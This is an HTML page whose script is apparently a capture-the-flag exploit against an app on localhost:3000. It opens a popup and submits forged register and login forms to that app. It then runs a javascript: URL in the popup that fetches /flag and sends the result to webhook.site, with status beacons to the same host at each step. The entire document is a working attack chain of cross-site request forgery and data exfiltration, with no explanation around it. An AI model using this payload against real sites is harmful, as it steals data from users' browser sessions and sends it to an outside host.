<!DOCTYPE html>
<html>
<body>
<script>
new Image().src = 'https://webhook.site/showontest?step=0_start';

var p = window.open("about:blank", "popup");

/* 1. register */
var r = document.createElement("form");
r.method = "POST";
r.action = "http://localhost:3000/register";
r.target = "popup";
r.innerHTML = '<input name="username" value="jspop4"><input name="password" value="jspop4">';
document.body.appendChild(r);
r.submit();

/* 2. login */
setTimeout(function() {
  new Image().src = 'https://webhook.site/showontest?step=1_login';
  var l = document.createElement("form");
  l.method = "POST";
  l.action = "http://localhost:3000/login";
  l.target = "popup";
  l.innerHTML = '<input name="username" value="jspop4"><input name="password" value="jspop4">';
  document.body.appendChild(l);
  l.submit();
}, 100);

/* 3. localhost 페이지 로드 */
setTimeout(function() {
  new Image().src = 'https://webhook.site/showontest?step=2_localhost';
  p.location = "http://localhost:3000/";
}, 300);

/* 4. javascript: URL 실행 - catch 추가 */
setTimeout(function() {
  new Image().src = 'https://webhook.site/showontest?step=3_js';
  p.location = "javascript:fetch('/flag').then(function(r){return r.text();}).then(function(f){new Image().src='https://webhook.site/showontest?flag='+encodeURIComponent(f);}).catch(function(e){new Image().src='https://webhook.site/showontest?err='+encodeURIComponent(e);});";
}, 500);
</script>
</body>
</html>